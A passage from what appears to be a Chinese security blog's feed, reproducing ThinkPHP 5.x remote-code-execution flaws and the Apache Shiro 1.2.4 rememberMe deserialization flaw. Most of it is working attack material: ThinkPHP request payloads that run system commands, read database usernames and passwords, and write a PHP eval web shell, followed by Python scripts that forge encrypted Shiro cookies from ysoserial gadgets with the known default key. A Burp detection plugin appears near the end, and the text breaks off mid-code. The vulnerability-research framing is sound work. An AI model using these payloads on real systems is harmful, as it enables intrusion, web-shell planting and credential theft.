class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo ^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure><p>通过 URL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  查看数据库用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.username</span><br><span class="line"></span><br><span class="line">#  查看数据库密码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.password</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  phpinfo</span><br><span class="line">index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="其他版本-POC"><a href="#其他版本-POC" class="headerlink" title="其他版本 POC"></a>其他版本 POC</h3><h4 id="当-PHP7-以上无法使用-Assert-的时候用"><a href="#当-PHP7-以上无法使用-Assert-的时候用" class="headerlink" title="当 PHP7 以上无法使用 Assert 的时候用"></a>当 PHP7 以上无法使用 Assert 的时候用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;包含&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h5 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\View&#x2F;display&amp;content&#x3D;%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data&#x3D;1</span><br></pre></td></tr></table></figure><h5 id="ThinkPHP-5-0-21"><a href="#ThinkPHP-5-0-21" class="headerlink" title="ThinkPHP 5.0.21"></a>ThinkPHP 5.0.21</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><h5 id="ThinkPhP-5-1"><a href="#ThinkPhP-5-1" class="headerlink" title="ThinkPhP 5.1.*"></a>ThinkPhP 5.1.*</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;system&amp;data&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br></pre></td></tr></table></figure><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到5.0.24及以上，不开启debug模式</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a><br><a href="https://blog.csdn.net/qq_29647709/article/details/84956221">https://blog.csdn.net/qq_29647709/article/details/84956221</a><br><a href="https://www.freebuf.com/vuls/194127.html">https://www.freebuf.com/vuls/194127.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2</summary>
      
    
    
    
    <category term="ThinkPHP 漏洞复现" scheme="https://administratorrs.github.io/categories/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="ThinkPHP 漏洞复现" scheme="https://administratorrs.github.io/tags/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Shiro 1.2.4 反序列化漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-17T06:21:20.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>参考-1：<a href="https://www.cnblogs.com/loong-hon/p/10619616.html">https://www.cnblogs.com/loong-hon/p/10619616.html</a><br>参考-2：<a href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a></p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#  获取 shrio 镜像</span><br><span class="line">sudo docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">#  重启 docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">#  启动 shiro 环境</span><br><span class="line">sudo docker run -d -p 8081:8080 medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure><p>如提示： <code>No module named &#39;Crypto&#39;</code></p><p>则需安装第三方库： <code>pycryptodome</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycryptodome</span><br></pre></td></tr></table></figure><h2 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h2><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/tags">ShiroExploit</a><br><a href="https://github.com/sv3nbeast/ShiroScan">Shiro_rce.py</a><br><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial.jar</a></p><h3 id="shiro-rce"><a href="#shiro-rce" class="headerlink" title="shiro_rce"></a>shiro_rce</h3><p><code>shiro_rce</code> 使用方法（会大量发包）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_rce.py http:&#x2F;&#x2F;192.168.1.233:8081&#x2F;login.jsp &quot;ping -c 127.0.0.1&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="s"><a href="#s" class="headerlink" title="s"></a>s</h3><p><code>s.py</code> 内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-SNAPSHOT.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p><code>s.py </code> 使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 s.py 192.168.1.203:1099</span><br></pre></td></tr></table></figure><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><code>shiron.py</code> 内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-SNAPSHOT.jar&#39;, &#39;URLDNS&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS   &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">    #key &#x3D;  &quot;Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;&quot;</span><br><span class="line">    #key &#x3D; &quot;wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">    mode &#x3D;  AES.MODE_CBC</span><br><span class="line">    iv   &#x3D;  uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">    with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:</span><br><span class="line">        print(&quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode()),file&#x3D;fpw)</span><br></pre></td></tr></table></figure><p><code>shiro.py</code> 使用方法（回显）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro.py &quot;http:&#x2F;&#x2F;test.test&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="shiro-command"><a href="#shiro-command" class="headerlink" title="shiro_command"></a>shiro_command</h3><p><code>shiro_command.py</code> 内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-SNAPSHOT.jar&#39;, &#39;CommonsCollections2&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS   &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">    mode &#x3D;  AES.MODE_CBC</span><br><span class="line">    iv   &#x3D;  uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">    with open(&quot;payload.cookies&quot;, &quot;w&quot;) as fpw:</span><br><span class="line">        print(&quot;rememberMe&#x3D;&#123;&#125;&quot;.format(payload.decode()), file&#x3D;fpw)</span><br></pre></td></tr></table></figure><p><code>shiro_command.py</code> 使用方法（命令执行，payload 在 payload.cookies 文件内）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_command.py &quot;ping -c 127.0.0.1&quot;</span><br></pre></td></tr></table></figure><h3 id="Burp-插件"><a href="#Burp-插件" class="headerlink" title="Burp 插件"></a>Burp 插件</h3><p><a href="https://www.jython.org/download">Jythpn（用于将 Python 代码转换成 JAVA 代码）</a></p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/plugin.png"></p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/plugin-2.png"></p><p>Shiro Discovery 内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># _*_ coding:utf-8 _*_</span><br><span class="line">__author__ &#x3D; &#39;tkswifty&#39;</span><br><span class="line"></span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IHttpListener</span><br><span class="line">from burp import IHttpRequestResponse</span><br><span class="line">from burp import IResponseInfo</span><br><span class="line">from burp import IRequestInfo</span><br><span class="line">from burp import IHttpService</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IHttpListener):</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.payload &#x3D; [&#39;rememberMe&#39;,&#39;rmemberMe-tk&#39;]</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        print(&quot;[+] #####################################&quot;)</span><br><span class="line">        print(&quot;[+]     Shiro Discovery&quot;)</span><br><span class="line">        print(&quot;[+]     Author: tkswifty&quot;)</span><br><span class="line">        print(&quot;[+] #####################################\r\n\r\n&quot;)</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        callbacks.setExtensionName(&#39;Shiro Discovery&#39;)</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        if toolFlag &#x3D;&#x3D; self._callbacks.TOOL_PROXY or toolFlag &#x3D;&#x3D; self._callbacks.TOOL_REPEATER:</span><br><span class="line">            # 监听Response</span><br><span class="line">            if not messageIsRequest:</span><br><span class="line"></span><br><span class="line">                &#39;&#39;&#39;请求数据&#39;&#39;&#39;</span><br><span class="line">                # 获取请求包的数据</span><br><span class="line">                resquest &#x3D; messageInfo.getRequest()</span><br><span class="line">                analyzedRequest &#x3D; self._helpers.analyzeRequest(resquest)</span><br><span class="line">                request_header &#x3D; analyzedRequest.getHeaders()</span><br><span class="line">                request_bodys &#x3D; resquest[analyzedRequest.getBodyOffset():].tostring()</span><br><span class="line">                request_host, request_Path &#x3D; self.get_request_host(request_header)</span><br><span class="line">                request_contentType &#x3D; analyzedRequest.getContentType()</span><br><span class="line">                if  len(filter(lambda x: &#39;Cookie&#39; in x, request_header))&gt;0:</span><br><span class="line">                pass</span><br><span class="line">                else:</span><br><span class="line">                request_header.append(&quot;Cookie:&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # 获取服务端的信息，主机地址，端口，协议</span><br><span class="line">                httpService &#x3D; messageInfo.getHttpService()</span><br><span class="line">                port &#x3D; httpService.getPort()</span><br><span class="line">                host &#x3D; httpService.getHost()</span><br><span class="line">                protocol &#x3D; httpService.getProtocol()</span><br><span class="line"></span><br><span class="line">                #修改cookie检测shiro</span><br><span class="line">                self.sendPayload(request_header, host, port, protocol, request_bodys,messageInfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 发起请求并进行Shiro检测</span><br><span class="line">    def sendPayload(self, request_header, host, port, protocol, request_bodys,messageInfo):</span><br><span class="line">    for shiroHeader in self.payload:</span><br><span class="line">    for i in xrange(0,len(request_header)):</span><br><span class="line">    if request_header[i].startswith(&quot;Cookie:&quot;):</span><br><span class="line">    request_header[i] &#x3D; request_header[i]+&quot;;&quot;+shiroHeader+&quot;&#x3D;shiroDiscover&quot;</span><br><span class="line">    newRequest &#x3D; self._helpers.buildHttpMessage(request_header,self._helpers.stringToBytes(request_bodys))</span><br><span class="line">                        if &#39;s&#39; in protocol:</span><br><span class="line">                            ishttps &#x3D; True</span><br><span class="line">                        else:</span><br><span class="line">                            ishttps &#x3D; False</span><br><span class="line">                        expression &#x3D; r&#39;.*(443).*&#39;</span><br><span class="line">                        if re.match(expression, str(port)):</span><br><span class="line">                           ishttps &#x3D; True</span><br><span class="line">                        rep &#x3D; self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)</span><br><span class="line"></span><br><span class="line">                        #新的请求响应包</span><br><span class="line">                        analyzedResponse &#x3D; self._helpers.analyzeResponse(rep)</span><br><span class="line">                        rep_headers &#x3D; analyzedResponse.getHeaders()</span><br><span class="line">                        expression &#x3D; r&#39;.*(deleteMe).*&#39;</span><br><span class="line">                        for rpheader in rep_headers:</span><br><span class="line">                            if rpheader.startswith(&quot;Set-Cookie:&quot;) and re.match(expression, rpheader):</span><br><span class="line">                                response_is_shiro &#x3D; True</span><br><span class="line">                                messageInfo.setHighlight(&#39;orange&#39;)</span><br><span class="line">                                print &quot;[+] Find Shiro application&quot;</span><br><span class="line">                                print &quot;\t[-] host:&quot; + str(host)</span><br><span class="line">                                print &quot;\t[-] port:&quot; + str(port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 获取请求的url</span><br><span class="line">    def get_request_host(self, reqHeaders):</span><br><span class="line">        uri &#x3D; reqHeaders[0].split(&#39; &#39;)[1]</span><br><span class="line">        host &#x3D; reqHeaders[1].split(&#39; &#39;)[1]</span><br><span class="line">        return host, uri</span><br><span class="line"></span><br><span class="line">    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数</span><br><span class="line">    def get_request_info(self, request):</span><br><span class="line">        analyzedIRequestInfo &#x3D; self._helpers.analyzeRequest(request)</span><br><span class="line">        reqHeaders &#x3D; analyzedIRequestInfo.getHeaders()</span><br><span class="line">        reqBodys &#x3D; request[analyzedIRequestInfo.getBodyOffset():].tostring()</span><br><span class="line">        reqMethod &#x3D; analyzedIRequestInfo.getMethod()</span><br><span class="line">        reqParameters &#x3D; analyzedIRequestInfo.getParameters()</span><br><span class="line">        reqHost, reqPath &#x3D; 